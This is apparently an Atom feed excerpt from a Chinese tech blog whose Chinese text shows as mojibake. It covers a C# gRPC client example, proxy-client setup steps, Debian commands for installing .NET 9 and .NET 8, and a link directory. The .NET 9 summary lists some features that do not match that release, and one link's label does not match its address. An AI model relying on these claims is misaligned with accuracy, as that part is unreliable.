class="line"><span class="comment">// ç¡®ä¿å‘½åç©ºé—´ä¸ example.proto ä¸­çš„ package å®šä¹‰ä¸€è‡´</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»º gRPC é€šé“</span></span><br><span class="line">        <span class="keyword">using</span> <span class="keyword">var</span> channel = GrpcChannel.ForAddress(<span class="string">&quot;http://127.0.0.1:50051&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºå®¢æˆ·ç«¯</span></span><br><span class="line">        <span class="keyword">var</span> client = <span class="keyword">new</span> ExampleService.ExampleServiceClient(channel);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨æœåŠ¡æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">var</span> request = <span class="keyword">new</span> HelloRequest &#123; Name = <span class="string">&quot;World&quot;</span> &#125;;</span><br><span class="line">        <span class="keyword">var</span> reply = <span class="keyword">await</span> client.SayHelloAsync(request);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¾“å‡ºæœåŠ¡å“åº”</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Server Response: &quot;</span> + reply.Message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>è¿è¡Œå®¢æˆ·ç«¯<br>ç¡®ä¿ Node.js gRPC æœåŠ¡å™¨æ­£åœ¨è¿è¡Œã€‚</li></ol><p>åœ¨çš„ C# é¡¹ç›®ç›®å½•ä¸­è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet run</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œçœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼š</p><p>Server Response: Hello, World!</p><p>Proto æ–‡ä»¶çš„è·¯å¾„é…ç½®ï¼š ç¡®ä¿ example.proto ä¸­çš„ package å®šä¹‰ä¸º Exampleï¼Œå¹¶ä¸ C# å‘½åç©ºé—´ä¸€è‡´ã€‚</p><p>ç”Ÿæˆçš„å®¢æˆ·ç«¯ä»£ç ï¼š æ ¹æ® example.protoï¼Œå·¥å…·ä¼šç”Ÿæˆ ExampleServiceClient å’Œ HelloRequest&#x2F;HelloReply ç±»ã€‚åªéœ€è°ƒç”¨è¿™äº›ç±»ä¸æœåŠ¡é€šä¿¡ã€‚</p><p>gRPC é€šé“ï¼š ä½¿ç”¨ GrpcChannel.ForAddress åˆ›å»ºä¸€ä¸ªåˆ°æœåŠ¡å™¨çš„è¿æ¥ã€‚</p><p>å¼‚æ­¥è°ƒç”¨ï¼š gRPC æ–¹æ³•é€šå¸¸æ˜¯å¼‚æ­¥çš„ï¼Œä½¿ç”¨ await æ¥è°ƒç”¨å®ƒä»¬ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;gRPCï¼ˆGoogle-Remote-Procedure-Callï¼‰&quot;&gt;&lt;a href=&quot;#gRPCï¼ˆGoogle-Remote-Procedure-Callï¼‰&quot; class=&quot;headerlink&quot; title=&quot;gRPCï¼ˆGoogle Remote Proce</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term=".net" scheme="https://banjinmei.github.io/tags/net/"/>
    
    <category term="node" scheme="https://banjinmei.github.io/tags/node/"/>
    
    <category term="gRPC" scheme="https://banjinmei.github.io/tags/gRPC/"/>
    
  </entry>
  
  <entry>
    <title>Clash V2Ray ClashVerge ç§‘å­¦ä¸Šç½‘ å¯Œå¼º</title>
    <link href="https://banjinmei.github.io/2024/12/06/Clash-V2RayClashVerge-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-%E5%AF%8C%E5%BC%BA/"/>
    <id>https://banjinmei.github.io/2024/12/06/Clash-V2RayClashVerge-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-%E5%AF%8C%E5%BC%BA/</id>
    <published>2024-12-06T15:13:02.000Z</published>
    <updated>2024-12-06T15:57:02.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Clash-android"><a href="#Clash-android" class="headerlink" title="Clash android"></a>Clash android</h1><p>github.com&#x2F;metacubex&#x2F;clashmetaforandroid&#x2F;releases</p><p>1.é…ç½®  - å³ä¸Šè§’ +  urlå¯¼å…¥<br>2.è¾“å…¥url save<br>3.ç‚¹å‡»å·²åœæ­¢ -&gt; åˆ‡æ¢æˆ è¿è¡Œä¸­<br>4.ç‚¹å‡»ä»£ç† é€‰æ‹©èŠ‚ç‚¹</p><h1 id="V2Ray-win"><a href="#V2Ray-win" class="headerlink" title="V2Ray win"></a>V2Ray win</h1><p>github.com&#x2F;2dust&#x2F;v2rayN&#x2F;releases</p><p>1.è®¢é˜…åˆ†ç»„ -&gt; è®¢é˜…åˆ†ç»„è®¾ç½®   save<br>2.è®¢é˜…åˆ†ç»„ -&gt; æ›´æ–°å…¨éƒ¨è®¢é˜…<br>3.æœåŠ¡å™¨ -&gt; è®¾ä¸ºæ´»åŠ¨æœåŠ¡å™¨  or  å³é”®æ‰˜ç›˜ è‡ªåŠ¨</p><h1 id="ClashVerge-mac"><a href="#ClashVerge-mac" class="headerlink" title="ClashVerge mac"></a>ClashVerge mac</h1><p>github.com&#x2F;clash-verge-rev&#x2F;clash-verge&#x2F;releases</p><p>1.èœå•&gt;è®¢é˜… - æ–°å»º<br>2.åç§° é—´éš” 300min è¾“å…¥è®¢é˜…é“¾æ¥ save<br>3.é€‰ä¸­ åˆ·æ–°<br>4.èœå•&gt;ä»£ç† - å…¨å±€ -èŠ‚ç‚¹ é€‰æ‹©ç»¿è‰²çš„<br>5.èœå•&gt;è®¾ç½® - ç³»ç»Ÿä»£ç† å¼€å…³</p><p>ios shadowrocket sing-box</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Clash-android&quot;&gt;&lt;a href=&quot;#Clash-android&quot; class=&quot;headerlink&quot; title=&quot;Clash android&quot;&gt;&lt;/a&gt;Clash android&lt;/h1&gt;&lt;p&gt;github.com&amp;#x2F;metacubex&amp;</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>ASP.NET Core 9.0</title>
    <link href="https://banjinmei.github.io/2024/12/05/ASP-NET-Core-9-0/"/>
    <id>https://banjinmei.github.io/2024/12/05/ASP-NET-Core-9-0/</id>
    <published>2024-12-05T13:56:25.000Z</published>
    <updated>2025-01-01T15:59:46.266Z</updated>
    
    <content type="html"><![CDATA[<h1 id="net9"><a href="#net9" class="headerlink" title=".net9"></a>.net9</h1><p>å¼•å…¥äº†æ‰©å±•ç±»å‹ç‰¹æ€§ï¼Œå…è®¸å¼€å‘è€…æ‰©å±•å®ä¾‹æˆå‘˜ã€é™æ€æˆå‘˜ä»¥åŠå±æ€§æˆå‘˜ï¼Œæ‰“ç ´äº†ä»¥å¾€åªèƒ½é€šè¿‡é™æ€ç±»å®šä¹‰æ‰©å±•æ–¹æ³•çš„é™åˆ¶ï¼›params å…³é”®å­—ä¸å†å±€é™äºæ•°ç»„ç±»å‹ï¼Œå¯ä¸å¤šç§é›†åˆç±»å‹ä¸€èµ·ä½¿ç”¨ï¼›æ–°å¢ System.Threading.Lock ç±»å‹ç”¨äºçº¿ç¨‹åŒæ­¥ï¼Œæ”¹è¿›äº†çº¿ç¨‹åŒæ­¥æœºåˆ¶ï¼›å¼‚å¸¸å¤„ç†é€Ÿåº¦å¤§å¹…æå‡ï¼Œç¯è·¯æ€§èƒ½ä¹Ÿæœ‰æ‰€æé«˜ï¼ŒåŠ¨æ€ PGO é™ä½äº†ç±»å‹æ£€æŸ¥æˆæœ¬ï¼ŒRyuJIT ç¼–è¯‘å™¨å†…è”æ›´é€šç”¨çš„æ–¹æ³•ä»¥å‡å°‘æ–¹æ³•è°ƒç”¨å¼€é”€ç­‰.<br><strong>linq</strong>æ–°å¢äº† CountBy å’Œ AggregateBy æ–¹æ³•ï¼Œå¯é€šè¿‡é”®è¿›è¡ŒçŠ¶æ€èšåˆï¼Œæ— éœ€é€šè¿‡ GroupBy è¿›è¡Œä¸­é—´åˆ†ç»„ï¼Œæé«˜äº†æ•°æ®æŸ¥è¯¢çš„æ•ˆç‡å’Œçµæ´»æ€§.<br>å¼•å…¥äº† CryptographicOperations ç±»å‹ä¸­çš„æ–°çš„ä¸€æ¬¡æ€§å“ˆå¸Œæ–¹æ³•ï¼Œæ”¯æŒæœ€æ–°çš„åŠ å¯†æ ‡å‡†ï¼Œå¹¶æ–°å¢äº†ä¸€äº›åŠ å¯†ç›¸å…³çš„ APIï¼›å¼ºåŒ–äº†å®‰å…¨æœºåˆ¶ï¼Œå¦‚å¼•å…¥æ›´å¼ºå¤§çš„èº«ä»½éªŒè¯å’Œæˆæƒæœºåˆ¶ï¼Œæ”¯æŒ OAuth 2.0 å’Œ OpenID Connect ç­‰ï¼Œè¿˜é€šè¿‡ AI é©±åŠ¨çš„å®‰å…¨åŠŸèƒ½å®ç°å®æ—¶å¨èƒæ£€æµ‹</p><h1 id="Debian-12-å®‰è£…-NET-9"><a href="#Debian-12-å®‰è£…-NET-9" class="headerlink" title="Debian 12 å®‰è£….NET 9"></a>Debian 12 å®‰è£….NET 9</h1><h2 id="æ·»åŠ -Microsoft-åŒ…ç­¾åå¯†é’¥å’ŒåŒ…å­˜å‚¨åº“ï¼š"><a href="#æ·»åŠ -Microsoft-åŒ…ç­¾åå¯†é’¥å’ŒåŒ…å­˜å‚¨åº“ï¼š" class="headerlink" title="æ·»åŠ  Microsoft åŒ…ç­¾åå¯†é’¥å’ŒåŒ…å­˜å‚¨åº“ï¼š"></a>æ·»åŠ  Microsoft åŒ…ç­¾åå¯†é’¥å’ŒåŒ…å­˜å‚¨åº“ï¼š</h2><p>æ‰“å¼€ç»ˆç«¯ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb</span><br><span class="line">sudo dpkg -i packages-microsoft-prod.deb</span><br><span class="line"><span class="built_in">rm</span> packages-microsoft-prod.deb</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…-NET-SDKï¼š"><a href="#å®‰è£…-NET-SDKï¼š" class="headerlink" title="å®‰è£….NET SDKï¼š"></a>å®‰è£….NET SDKï¼š</h2><p>å¦‚æœéœ€è¦å¼€å‘.NET åº”ç”¨ç¨‹åºï¼Œå¯å®‰è£….NET SDKï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; \</span><br><span class="line">sudo apt-get install -y dotnet-sdk-9.0</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…-NET-è¿è¡Œæ—¶ï¼š"><a href="#å®‰è£…-NET-è¿è¡Œæ—¶ï¼š" class="headerlink" title="å®‰è£….NET è¿è¡Œæ—¶ï¼š"></a>å®‰è£….NET è¿è¡Œæ—¶ï¼š</h2><p>å¦‚æœåªéœ€è¦è¿è¡Œ.NET åº”ç”¨ç¨‹åºï¼Œå¯å®‰è£….NET è¿è¡Œæ—¶ã€‚å»ºè®®å®‰è£…ASP.NET Core è¿è¡Œæ—¶ï¼Œå› ä¸ºå®ƒåŒ…å«äº†.NET å’ŒASP.NET Core è¿è¡Œæ—¶ï¼Œåœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; \</span><br><span class="line">sudo apt-get install -y aspnetcore-runtime-9.0</span><br></pre></td></tr></table></figure><h2 id="ä½œä¸ºASP-NET-Core-è¿è¡Œæ—¶çš„æ›¿ä»£æ–¹æ³•"><a href="#ä½œä¸ºASP-NET-Core-è¿è¡Œæ—¶çš„æ›¿ä»£æ–¹æ³•" class="headerlink" title="ä½œä¸ºASP.NET Core è¿è¡Œæ—¶çš„æ›¿ä»£æ–¹æ³•"></a>ä½œä¸ºASP.NET Core è¿è¡Œæ—¶çš„æ›¿ä»£æ–¹æ³•</h2><p>ä¹Ÿå¯ä»¥å®‰è£…ä¸åŒ…å«ASP.NET Core æ”¯æŒçš„.NET è¿è¡Œæ—¶ï¼Œå°†ä¸Šè¿°å‘½ä»¤ä¸­çš„aspnetcore-runtime-9.0æ›¿æ¢ä¸ºdotnet-runtime-9.0ï¼Œå³ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y dotnet-runtime-9.0</span><br></pre></td></tr></table></figure><h2 id="éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ"><a href="#éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ" class="headerlink" title="éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ"></a>éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet --version </span><br></pre></td></tr></table></figure><h1 id="old-NET8"><a href="#old-NET8" class="headerlink" title="old .NET8"></a>old .NET8</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update </span><br><span class="line">sudo apt upgrade -y</span><br><span class="line">wget -O ä¸‹è½½å¹¶ä»¥ä¸åŒçš„æ–‡ä»¶åä¿å­˜</span><br></pre></td></tr></table></figure><h2 id="æ·»åŠ -Microsoft-åŒ…ä»“åº“"><a href="#æ·»åŠ -Microsoft-åŒ…ä»“åº“" class="headerlink" title="æ·»åŠ  Microsoft åŒ…ä»“åº“"></a>æ·»åŠ  Microsoft åŒ…ä»“åº“</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb</span><br><span class="line">sudo dpkg -i packages-microsoft-prod.deb</span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h2 id="2-net8"><a href="#2-net8" class="headerlink" title="2 .net8"></a>2 .net8</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y dotnet-sdk-8.0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb</span><br><span class="line">sudo dpkg -i packages-microsoft-prod.deb</span><br><span class="line"><span class="comment"># 8 </span></span><br><span class="line"></span><br><span class="line">sudo apt-get update; \</span><br><span class="line">  sudo apt-get install -y apt-transport-https &amp;&amp; \</span><br><span class="line">  sudo apt-get update &amp;&amp; \</span><br><span class="line">  sudo apt-get install -y dotnet-sdk-8.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;net9&quot;&gt;&lt;a href=&quot;#net9&quot; class=&quot;headerlink&quot; title=&quot;.net9&quot;&gt;&lt;/a&gt;.net9&lt;/h1&gt;&lt;p&gt;å¼•å…¥äº†æ‰©å±•ç±»å‹ç‰¹æ€§ï¼Œå…è®¸å¼€å‘è€…æ‰©å±•å®ä¾‹æˆå‘˜ã€é™æ€æˆå‘˜ä»¥åŠå±æ€§æˆå‘˜ï¼Œæ‰“ç ´äº†ä»¥å¾€åªèƒ½é€šè¿‡é™æ€ç±»å®šä¹‰æ‰©å±•æ–¹æ³•çš„é™åˆ¶ï¼›param</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term=".net9.0" scheme="https://banjinmei.github.io/tags/net9-0/"/>
    
  </entry>
  
  <entry>
    <title>Navigation</title>
    <link href="https://banjinmei.github.io/2024/12/04/Navigation/"/>
    <id>https://banjinmei.github.io/2024/12/04/Navigation/</id>
    <published>2024-12-04T11:31:51.000Z</published>
    <updated>2024-12-25T17:29:08.714Z</updated>
    
    <content type="html"><![CDATA[<div><a href="#Study">Study</a><a href="#Tools">Tools</a><a href="#AI">AI</a><a href="#Hexo">Hexo</a><a href="#Fun">Fun</a><a href="#Game">Game</a><!-- <a href="#tAI">AI</a> --></div><div id ="app3"></div><script>        const data = [{    "category": "Study",    "items": [           {            "title": "web3",            "url": "https://www.hackquest.io/ ",            "img": "https://t8.baidu.com/it/u=2123981564,3721828760&fm=217&app=126&size=f242,150&n=0&f=PNG",            "description": "web3 Learn and Grow Careers in Web3."        },        {            "title": "äººäººéƒ½æ˜¯äº§å“ç»ç†",            "url": "https://www.woshipm.com/",            "img": "https://image.woshipm.com/fp/images/logo.png",            "description": "äº§å“ç»ç†ã€äº§å“çˆ±å¥½è€…å­¦ä¹ äº¤æµå¹³å°"        },        {            "title": "Element Plus",            "url": "https://element-plus.org/",            "img": "https://element-plus.org/images/element-plus-logo.svg",            "description": "é¢å‘è®¾è®¡å¸ˆå’Œå¼€å‘è€…çš„ç»„ä»¶åº“ åŸºäºVue 3"        },        {            "title": "AMZ123",            "url": "https://www.amz123.com/",            "img": "https://t7.baidu.com/it/u=1062105737,570237901&fm=190&app=131&size=f242,150&n=0&f=JPE",            "description": "AMZ123äºšé©¬é€Šå¯¼èˆªæ˜¯ä¸€å®¶è‡´åŠ›äºæœåŠ¡ä¸­å›½è·¨å¢ƒç”µå•†ä»ä¸šè€…çš„ç»¼åˆå¹³å°"        },        {            "title": "nodejs",            "url": "https://nodejs.org/",            "img": "https://nodejs.org/static/logos/nodejsDark.svg",            "description": "Node.jsÂ® æ˜¯ä¸€ä¸ªå…è´¹ã€å¼€æºã€è·¨å¹³å°çš„JavaScriptè¿è¡Œæ—¶ç¯å¢ƒ,"        },        {            "title": "phpä¸­æ–‡ç½‘",            "url": "https://www.php.cn/",            "img": "https://www.php.cn/static/images/logo.png",            "description": "php.cn phpä¸­æ–‡ç½‘-æ•™ç¨‹_æ‰‹å†Œ_è§†é¢‘-å…è´¹phpåœ¨çº¿å­¦ä¹ å¹³å°"        },        {            "title": "èœé¸Ÿæ•™ç¨‹",            "url": "https://www.runoob.com/",            "img": "https://www.runoob.com/wp-content/themes/runoob/assets/img/runoob-logo.png",            "description": "èœé¸Ÿæ•™ç¨‹ å­¦çš„ä¸ä»…æ˜¯æŠ€æœ¯ï¼Œæ›´æ˜¯æ¢¦æƒ³ï¼"        },        {            "title": "å…¨çƒä¸»æœºäº¤æµè®º",            "url": "https://hostloc.com/",            "img": "https://hostloc.com/static/image/common/logo.png",            "description": "vps"        },        {            "title": "V2EX",            "url": "https://www.v2ex.com/",            "img": "/images/face.png",            "description": "V2EX åˆ›æ„å·¥ä½œè€…çš„ç¤¾åŒºã€‚è®¨è®ºç¼–ç¨‹ã€è®¾è®¡ã€ç¡¬ä»¶ã€æ¸¸æˆç­‰ä»¤äººæ¿€åŠ¨çš„è¯é¢˜ã€‚"        },        {            "title": "LINUX DO",            "url": "https://linux.do/",            "img": "https://linux.do/uploads/default/original/3X/b/4/b4fa45d8b03df61f5d011e173c0adf8497028b16.png",            "description": "LINUX DO - æ–°çš„ç†æƒ³å‹ç¤¾åŒº"        },        {            "title": "ç”µé¸­",            "url": "https://eleduck.com/",            "img": "https://static.eleduck.com/_next/static/media/logo.dec76c92.png",            "description": "ç”µé¸­ç¤¾åŒº,ä¸“æ³¨è¿œç¨‹åŠå…¬åŠæ‹›è˜,è¿œç¨‹åŠå…¬ä»ç”µé¸­å¼€å§‹,è¿œç¨‹å·¥ä½œ,è‡ªç”±èŒä¸š,å…¼èŒå¤–åŒ…,åœ¨å®¶å·¥ä½œ,remote working,remotely,freelancer,"        },        {            "title": "GitHub",            "url": "https://github.com/",            "img": "https://github.githubassets.com/images/icons/emoji/octocat.png",            "description": "Build software better, together GitHub is where people build software. "        },        {            "title": "golang",            "url": "https://golang.google.cn/",            "img": "/images/face.png",            "description": "https://golang.google.cn/"        },        {            "title": "CSDN",            "url": "https://www.csdn.net/",            "img": "https://t8.baidu.com/it/u=945984959,3948445137&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "CSDN ä¸­æ–‡ITæŠ€æœ¯äº¤æµå¹³å°,åˆ›å»ºäº1999å¹´,åŒ…å«åŸåˆ›åšå®¢ã€ç²¾å“é—®ç­”ã€èŒä¸šåŸ¹è®­ã€æŠ€æœ¯è®ºå›"        },        {            "title": "OSCHINA",            "url": "https://www.oschina.net/",            "img": "https://t8.baidu.com/it/u=2619601293,3923045050&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "OSCHINA - ä¸­æ–‡å¼€æºæŠ€æœ¯äº¤æµç¤¾åŒº"        },        {            "title": "åä¸ºå¼€å‘è€…",            "url": "https://developer.apple.com/",            "img": "https://res-static.hc-cdn.cn/cloudbu-site/china/zh-cn/hdhomeportal/logonew.png",            "description": "å¼€å‘è€…,åä¸ºäº‘,HMS,é¸¿è’™,é²²é¹,æ˜‡è…¾,æ•°æ®åº“,AI,5G,äº‘åŸç”Ÿ,äº‘è®¡ç®—,å¤§èµ›,åä¸ºå¼€å‘è€…,åä¸º"        },        {            "title": "HarmonyOSå¼€å‘è€…ç¤¾åŒº",            "url": "https://harmonyosdev.csdn.net/",            "img": "https://devpress.csdnimg.cn/041451c94cbd45af95e7dab96007154a.png",            "description": "HarmonyOSå¼€å‘è€…ç¤¾åŒº"        },        {            "title": "apple developer",            "url": "https://developer.apple.com/",            "img": "https://developer-rno.apple.com/events/developer-centers/images/discover-programs_2x.jpg",            "description": "apple developer"        },        {            "title": "vivodev",            "url": "https://developer.vivo.com/",            "img": "https://ecmb.bdimg.com/tam-ogel/-1540521831_1768335019_88_88.png",            "description": "vivo developer,vivoå›½å¤–æ‰‹æœºå•†åº—,vivo appstore,vivoå…¨çƒæ‰‹æœºå•†åŸ"        },        {            "title": "AWS Amazon Web Services",            "url": "https://aws.amazon.com/",            "img": "https://a0.awsstatic.com/libra-css/images/logos/aws_smile-header-desktop-en-white_59x35.png",            "description": "AWS äº‘æœåŠ¡-ä¸“ä¸šçš„å¤§æ•°æ®å’Œäº‘è®¡ç®—æœåŠ¡ä»¥åŠäº‘è§£å†³æ–¹æ¡ˆæä¾›å•†"        },        {            "title": "é˜¿é‡Œäº‘",            "url": "https://aliyun.com/",            "img": "https://t8.baidu.com/it/u=4057341977,137104390&fm=190&app=131&size=f242,150&n=0&f=PNG",            "description": "ä¸Šäº‘å°±ä¸Šé˜¿é‡Œäº‘ã€‚"        },        {            "title": "googledev",            "url": "https://developers.google.com",            "img": "https://t9.baidu.com/it/u=1149675542,2513106999&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "Google for Developers - ä»AIå’Œäº‘åˆ°ç§»åŠ¨å’ŒWeb"        },        {            "title": "ThinkPHP",            "url": "https://www.thinkphp.cn/",            "img": "https://doc.topthink.com/lfs/02503b197ad195b8cc5eb97db82d7d0e657ade6c72e780dd8e1994f1ad806452.dat",            "description": "è½»é‡çº§PHPæ¡†æ¶|ä¸“æ³¨WEBåº”ç”¨å¼€å‘18å¹´ Â· ThinkPHP"        },        {            "title": "æ˜é‡‘",            "url": "https://juejin.cn/",            "img": "https://lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/e08da34488b114bd4c665ba2fa520a31.svg",            "description": "æ˜é‡‘æ˜¯é¢å‘å…¨çƒä¸­æ–‡å¼€å‘è€…çš„æŠ€æœ¯å†…å®¹åˆ†äº«ä¸äº¤æµå¹³å°"        },        {            "title": "hellogithub",            "url": "https://hellogithub.com/",            "img": "https://img.hellogithub.com/logo/logo.png",            "description": "å¼€æº,open source,å¼€æºç¤¾åŒº,å¼€æºé¡¹ç›®"        },        {            "title": "BigBear",            "url": "https://bigbearvpn.sodtool.com/",            "img": "https://wiki-bigbearvpn.sodtool.com/images/logo_black.png",            "description": "BigBear"        },        {            "title": "mitce",            "url": "https://mitce.com/?language=chinese",            "img": "https://st0.dancf.com/static/02/202306090204-51f4.png",            "description": "æä¾›å®‰å…¨çš„åŠ å¯†ç¶²è·¯ä»£ç†"        },        {            "title": "è…¾è®¯äº‘",            "url": "https://cloud.qq.com/",            "img": "https://cloudcache.tencent-cloud.com/qcloud/portal/kit/images/slice/logo.23996906.svg",            "description": "è…¾è®¯äº‘,tencent cloud,äº‘æœåŠ¡å™¨,äº‘ä¸»æœº,CDN,å¯¹è±¡å­˜å‚¨,åŸŸåæ³¨å†Œå¤‡æ¡ˆ,äº‘å­˜å‚¨,äº‘æ•°æ®åº“,äº’è”ç½‘+è§£å†³æ–¹æ¡ˆ,QQäº‘"        },        {            "title": "ç­‹æ–—äº‘",            "url": "https://www.jindouyun.cn/",            "img": "https://t7.baidu.com/it/u=1943493154,1028907721&fm=217&app=126&size=f242,150&n=0&f=PNG",            "description": "ç­‹æ–—äº‘ - ç®€å•å¥½ç”¨ã€é«˜æ€§ä»·æ¯”çš„äº‘æœåŠ¡å™¨_äº‘ä¸»æœº"        },        {            "title": "åä¸ºäº‘",            "url": "https://cloud.huawei.com/",            "img": "https://id1.cloud.huawei.com/CAS/static_rss/rss_20241031/CAS/vue3/vuebuild/img/cloundLoginLogo.png",            "description": "åä¸ºäº‘ç©ºé—´ï¼Œåä¸ºäº‘æœåŠ¡ï¼Œåä¸ºäº‘ï¼ŒæŸ¥æ‰¾æ‰‹æœºï¼ŒæŸ¥æ‰¾è®¾å¤‡ï¼Œåä¸ºæ‰‹æœºä¸¢äº†ï¼Œè£è€€æ‰‹æœºä¸¢äº†ï¼Œäº‘å¤‡ä»½ï¼Œåä¸ºæ‰‹æœºäº‘æœåŠ¡ï¼Œåä¸ºæ‰‹æœºä¸¢äº†è¿œç¨‹é”å®š"        }    ]},            {    "category": "Tools",    "items": [                   {            "title": "json",            "url": "https://www.sojson.com/",            "img": "https://t9.baidu.com/it/u=2962407189,358182402&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "jsonæ ¼å¼åŒ–"        },     {            "title": "freemp3",            "url": "https://www.qeecc.com/",            "img": "http://www.qeecc.com/images/logo.png",            "description": " freemp3  qm"        },          {            "title": "å‹ç¼©å›¾ç‰‡",            "url": "https://www.xunjietupian.com/yasuo/",            "img": "https://www.xunjietupian.com/img/icon/icon_logo.svg",            "description": "åœ¨çº¿å¿«é€Ÿå‹ç¼©å›¾ç‰‡4"        },              {            "title": "BTC USD",            "url": "https://www.tradingview.com/symbols/BTCUSD/",            "img": "https://t8.baidu.com/it/u=210671946,991419608&fm=3035&app=3035&size=f242,162&n=0&g=0n&f=JPEG",            "description": " BTC USD â€” Bitcoin Price and Chart â€” TradingView"        },      {            "title": "çˆ±ç«™ç½‘",            "url": "https://www.aizhan.com/",            "img": "https://statics.aizhan.com/images/img/logo.png",            "description": "ç«™é•¿å·¥å…·-ç™¾åº¦æƒé‡æ’åæŸ¥è¯¢-ç«™é•¿seoæŸ¥è¯¢ - çˆ±ç«™ç½‘"        },      {            "title": "ç«™é•¿ä¹‹å®¶",            "url": "https://www.chinaz.com/",            "img": "https://t9.baidu.com/it/u=1976338083,3457931785&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "ç«™é•¿ä¹‹å®¶ - ç«™é•¿èµ„è®¯-æˆ‘ä»¬è‡´åŠ›äºä¸ºä¸­æ–‡ç½‘ç«™æä¾›åŠ¨åŠ›ï¼"        },       {            "title": "å°é¸¡ç›‘æ§å¹³å°",            "url": "https://ping0.cc/vpsmon/30day",            "img": "https://t9.baidu.com/it/u=3796491837,1274263105&fm=217&app=126&size=f242,150&n=0&f=JPEG",            "description": "æœ€è¿‘30å¤©-IPåœ°å€å½’å±åœ°æŸ¥è¯¢-å…¨çƒå°é¸¡ç›‘æ§å¹³å°"        },        {            "title": "çŸ¥æ— ä¸è¨€",            "url": "https://wearesellers.com/ ",            "img": "https://t9.baidu.com/it/u=2291076767,879038089&fm=190&app=131&size=f242,150&n=0&f=JPEG",            "description": "è·¨å¢ƒç”µå•†äººçš„ç§‘å­¦ä¸–ç•Œ"        },        {            "title": "webcams",            "url": "https://www.skylinewebcams.com/",            "img": "https://cdn.jsdelivr.net/gh/SkylineWebcams/web@main/skylinewebcams.svg",            "description": "webcams"        },        {            "title": "Wayback Machine",            "url": "https://web.archive.org/",            "img": "/images/face.png",            "description": "wawayback machine ï¼Œ Internetæ¡£æ¡ˆé¦†(Internet Archive)ï¼Œæ—¶é—´å›æº¯æœº"        },        {            